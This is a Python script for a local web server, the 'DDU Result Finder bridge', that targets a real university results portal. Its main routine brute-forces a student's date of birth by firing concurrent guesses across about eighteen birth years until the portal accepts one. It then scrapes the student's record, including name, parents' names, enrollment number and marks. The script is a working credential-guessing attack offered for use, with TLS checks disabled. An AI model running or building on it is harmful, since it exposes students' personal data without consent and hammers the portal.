#!/usr/bin/env python3
"""
DDU Result Finder — Local High-Speed Bridge Server
Replicates and powers dob-finder.py and result-saver.py directly for the Web Portal.
Runs locally on http://127.0.0.1:8765 with zero-CORS restrictions and blazing async speed.
"""

import os
import sys
import asyncio
import re
import json
import logging
from datetime import datetime, timedelta
from typing import List, Optional, Dict, Any

try:
    import aiohttp
    from aiohttp import web, ClientSession, TCPConnector
    import bs4
except ImportError:
    print("❌ Missing dependencies! Please run: pip install aiohttp beautifulsoup4")
    sys.exit(1)

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger("ddu_bridge")

DDU_PORTAL_URL = "https://result.ddugu.ac.in/result2023/searchresult_new.aspx"
PORT = 8765

CORS_HEADERS = {
    "Access-Control-Allow-Origin": "*",
    "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
    "Access-Control-Allow-Headers": "Content-Type, Authorization, X-Requested-With",
}

# --- Date Generation & Priority Groups ---
DEFAULT_PRIORITY_GROUPS = [
    [2003, 2004, 2005, 2006, 2007, 2008],
    [1999, 2000, 2001, 2002, 2009, 2010],
    [1996, 1997, 1998, 2011, 2012, 2013]
]

def generate_dates_interleaved(years: List[int], month: Optional[int] = None) -> List[str]:
    dates = []
    if month:
        for day in range(1, 32):
            for y in years:
                try:
                    date = datetime(y, month, day)
                    dates.append(date.strftime('%Y-%m-%d'))
                except ValueError:
                    continue
    else:
        start_dates = {y: datetime(y, 1, 1) for y in years}
        end_dates = {y: datetime(y, 12, 31) for y in years}
        current = start_dates.copy()
        while True:
            finished = True
            for y in years:
                if current[y] <= end_dates[y]:
                    dates.append(current[y].strftime('%Y-%m-%d'))
                    current[y] += timedelta(days=1)
                    finished = False
            if finished:
                break
    return dates

def extract_form_data(html: str) -> Optional[Dict[str, str]]:
    viewstate = re.search(r'id="__VIEWSTATE" value="([^"]+)"', html)
    eventvalidation = re.search(r'id="__EVENTVALIDATION" value="([^"]+)"', html)
    viewstategenerator = re.search(r'id="__VIEWSTATEGENERATOR" value="([^"]+)"', html)
    if not all([viewstate, eventvalidation, viewstategenerator]):
        return None
    return {
        "__VIEWSTATE": viewstate.group(1),
        "__EVENTVALIDATION": eventvalidation.group(1),
        "__VIEWSTATEGENERATOR": viewstategenerator.group(1),
    }

def parse_result_html(html: str) -> Dict[str, Any]:
    soup = bs4.BeautifulSoup(html, "html.parser")
    data: Dict[str, Any] = {
        "name": "",
        "roll_no": "",
        "father_name": "",
        "mother_name": "",
        "enrollment_no": "",
        "college_name": "",
        "course": "",
        "semester": "",
        "sgpa": "",
        "cgpa": "",
        "result": "",
        "carry_over": "",
        "declared_on": "",
        "subjects": []
    }

    # Spans
    for span in soup.find_all("span"):
        txt = span.get_text(strip=True)
        if "Result :" in txt:
            data["result"] = txt.split("Result :")[-1].strip()
        elif "(SGPA) :" in txt:
            data["sgpa"] = txt.split("(SGPA) :")[-1].strip()
        elif "(CGPA) :" in txt:
            data["cgpa"] = txt.split("(CGPA) :")[-1].strip()
        elif "Carry Over Paper :" in txt:
            data["carry_over"] = txt.split("Carry Over Paper :")[-1].strip().rstrip(",")
        elif "Declared On :" in txt:
            data["declared_on"] = txt.split("Declared On :")[-1].strip()
        elif "Semester :" in txt:
            data["semester"] = txt.split("Semester :")[-1].strip()

    # Table cells for metadata
    tds = soup.find_all("td")
    for i, td in enumerate(tds):
        label = td.get_text(strip=True)
        next_td = td.find_next_sibling("td")
        if next_td:
            val = next_td.get_text(strip=True)
            if label == "Name" and not data["name"]:
                data["name"] = val
            elif label == "Roll No" and not data["roll_no"]:
                data["roll_no"] = val
            elif label == "Father's Name" and not data["father_name"]:
                # Sometimes has duplicate name tab-separated
                if "\t" in val:
                    val = val.split("\t")[-1].strip()
                data["father_name"] = val
            elif label == "Mother's Name" and not data["mother_name"]:
                data["mother_name"] = val
            elif label == "Enrollment No" and not data["enrollment_no"]:
                data["enrollment_no"] = val
            elif label == "University / College Name" and not data["college_name"]:
                data["college_name"] = val
            elif label == "Course" and not data["course"]:
                data["course"] = val

    # Subject rows
    for tr in soup.find_all("tr"):
        cells = [c.get_text(strip=True) for c in tr.find_all(["td", "th"])]
        if len(cells) >= 10:
            code = cells[0]
            # Match standard DDU course code formats e.g. MAT101F, PHY101F, AE1DDSP, SE1PHI
            if re.match(r"^[A-Z]{1,6}\d+[A-Za-z0-9\-\*]*$", code):
                data["subjects"].append({
                    "code": code,
                    "title": cells[1],
                    "ext_th": cells[2],
                    "int_th": cells[3],
                    "int_pr": cells[4],
                    "ext_pr": cells[5],
                    "obtained": cells[6],
                    "credits": cells[7],
                    "grade": cells[8],
                    "grade_point": cells[9]
                })

    return data

# --- Core Async Operations ---
async def try_single_dob(session: ClientSession, roll_str: str, semester: str, dob: str, form_data: Dict[str, str], semaphore: asyncio.Semaphore) -> Optional[str]:
    async with semaphore:
        try:
            payload = form_data.copy()
            payload.update({
                "ddlsem": str(semester),
                "txtRollno": str(roll_str),
                "txtDob": str(dob),
                "btnSearch": "Search Result"
            })
            async with session.post(DDU_PORTAL_URL, data=payload, allow_redirects=False, timeout=aiohttp.ClientTimeout(total=8)) as resp:
                if resp.status == 302:
                    return dob
                elif resp.status >= 500:
                    return "DOWN"
        except (aiohttp.ClientError, asyncio.TimeoutError):
            return "DOWN"
        except Exception:
            return None
    return None

async def find_dob_for_roll(session: ClientSession, roll_no: str, semester: str, month_filter: Optional[int] = None, priority_groups: Optional[List[List[int]]] = None, progress_cb = None) -> Dict[str, Any]:
    groups = priority_groups or DEFAULT_PRIORITY_GROUPS
    roll_str = str(roll_no).strip()

    # Get fresh form tokens
    try:
        async with session.get(DDU_PORTAL_URL, timeout=aiohttp.ClientTimeout(total=10)) as resp:
            if resp.status != 200:
                return {"roll_no": roll_str, "status": "down", "error": f"Portal returned HTTP {resp.status}"}
            html = await resp.text()
    except Exception as e:
        return {"roll_no": roll_str, "status": "down", "error": str(e)}

    base_form = extract_form_data(html)
    if not base_form:
        return {"roll_no": roll_str, "status": "error", "error": "Failed to parse ASP.NET form tokens"}

    semaphore = asyncio.Semaphore(40)
    dates_tested = 0

    for group_idx, years in enumerate(groups):
        dates = generate_dates_interleaved(years, month_filter)
        
        # Test in batches for responsive progress reporting
        batch_size = 20
        for i in range(0, len(dates), batch_size):
            batch = dates[i:i + batch_size]
            tasks = [try_single_dob(session, roll_str, semester, d, base_form, semaphore) for d in batch]
            results = await asyncio.gather(*tasks)

            for d, res in zip(batch, results):
                dates_tested += 1
                if res == "DOWN":
                    return {"roll_no": roll_str, "status": "down", "dates_tested": dates_tested, "error": "Portal went down"}
                if res and res != "DOWN":
                    if progress_cb:
                        await progress_cb({"roll_no": roll_str, "found": True, "dob": res, "dates_tested": dates_tested})
                    return {"roll_no": roll_str, "status": "found", "dob": res, "dates_tested": dates_tested}

            if progress_cb and dates_tested % 40 == 0:
                await progress_cb({"roll_no": roll_str, "testing": True, "dates_tested": dates_tested, "group": group_idx + 1})

    return {"roll_no": roll_str, "status": "not_found", "dob": None, "dates_tested": dates_tested}

async def fetch_result_page(session: ClientSession, roll_no: str, semester: str, dob: str) -> Dict[str, Any]:
    roll_str = str(roll_no).strip()
    try:
        # Step 1: Get base form tokens
        async with session.get(DDU_PORTAL_URL, timeout=aiohttp.ClientTimeout(total=10)) as resp:
            if resp.status != 200:
                return {"status": "error", "error": f"Portal GET returned HTTP {resp.status}"}
            html = await resp.text()

        form_data = extract_form_data(html)
        if not form_data:
            return {"status": "error", "error": "Form tokens missing"}

        # Step 2: Post roll + dob
        form_data.update({
            "ddlsem": str(semester),
            "txtRollno": roll_str,
            "txtDob": str(dob),
            "btnSearch": "Search Result"
        })

        async with session.post(DDU_PORTAL_URL, data=form_data, allow_redirects=False, timeout=aiohttp.ClientTimeout(total=10)) as post_resp:
            if post_resp.status != 302:
                return {"status": "error", "error": f"Portal POST expected 302 redirect, got {post_resp.status}"}
            
            loc = post_resp.headers.get("Location")
            if not loc:
                return {"status": "error", "error": "Missing redirect location header"}
            
            if loc.startswith("/"):
                target_url = "https://result.ddugu.ac.in" + loc
            else:
                target_url = loc

        # Step 3: Fetch result page
        async with session.get(target_url, timeout=aiohttp.ClientTimeout(total=12)) as res_resp:
            if res_resp.status != 200:
                return {"status": "error", "error": f"Result page returned HTTP {res_resp.status}"}
            res_html = await res_resp.text()

        # Step 4: Parse structured data
        parsed = parse_result_html(res_html)
        parsed["status"] = "success"
        parsed["html"] = res_html
        return parsed

    except Exception as e:
        return {"status": "error", "error": str(e)}

# --- aiohttp Web Handlers ---
async def options_handler(request):
    return web.Response(headers=CORS_HEADERS)

async def handle_status(request):
    async with ClientSession(connector=TCPConnector(ssl=False)) as session:
        portal_online = False
        msg = "Unknown"
        try:
            async with session.get(DDU_PORTAL_URL, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                portal_online = resp.status == 200
                msg = f"HTTP {resp.status}" if resp.status != 200 else "Online"
        except Exception as e:
            msg = str(e)

    return web.json_response({
        "status": "online",
        "service": "DDU Result Finder Local Bridge",
        "version": "1.0.0",
        "portal_online": portal_online,
        "portal_status": msg,
        "portal_url": DDU_PORTAL_URL
    }, headers=CORS_HEADERS)

async def handle_find_dob(request):
    try:
        data = await request.json()
    except Exception:
        return web.json_response({"error": "Invalid JSON body"}, status=400, headers=CORS_HEADERS)

    roll_no = data.get("roll_no")
    semester = data.get("semester", "1")
    month_filter = data.get("month")

    if not roll_no:
        return web.json_response({"error": "Missing roll_no"}, status=400, headers=CORS_HEADERS)

    async with ClientSession(connector=TCPConnector(limit=60, ssl=False)) as session:
        res = await find_dob_for_roll(session, roll_no, semester, month_filter=month_filter)
        return web.json_response(res, headers=CORS_HEADERS)

async def handle_get_result(request):
    try:
        data = await request.json()
    except Exception:
        return web.json_response({"error": "Invalid JSON body"}, status=400, headers=CORS_HEADERS)

    roll_no = data.get("roll_no")
    semester = data.get("semester", "1")
    dob = data.get("dob")

    if not roll_no or not dob:
        return web.json_response({"error": "Missing roll_no or dob"}, status=400, headers=CORS_HEADERS)

    async with ClientSession(connector=TCPConnector(limit=10, ssl=False)) as session:
        res = await fetch_result_page(session, roll_no, semester, dob)
        return web.json_response(res, headers=CORS_HEADERS)

def create_app() -> web.Application:
    app = web.Application()
    app.router.add_route("OPTIONS", "/{tail:.*}", options_handler)
    app.router.add_get("/api/status", handle_status)
    app.router.add_post("/api/find_dob", handle_find_dob)
    app.router.add_post("/api/get_result", handle_get_result)
    return app

def main():
    print("=" * 60)
    print("  🎓 DDU Result Finder — Local High-Speed Bridge Server")
    print(f"  ⚡ Running at: http://127.0.0.1:{PORT}")
    print("  🚀 Connects directly with DDU Result Finder Web Portal")
    print("=" * 60)
    app = create_app()
    web.run_app(app, host="127.0.0.1", port=PORT)

if __name__ == "__main__":
    main()

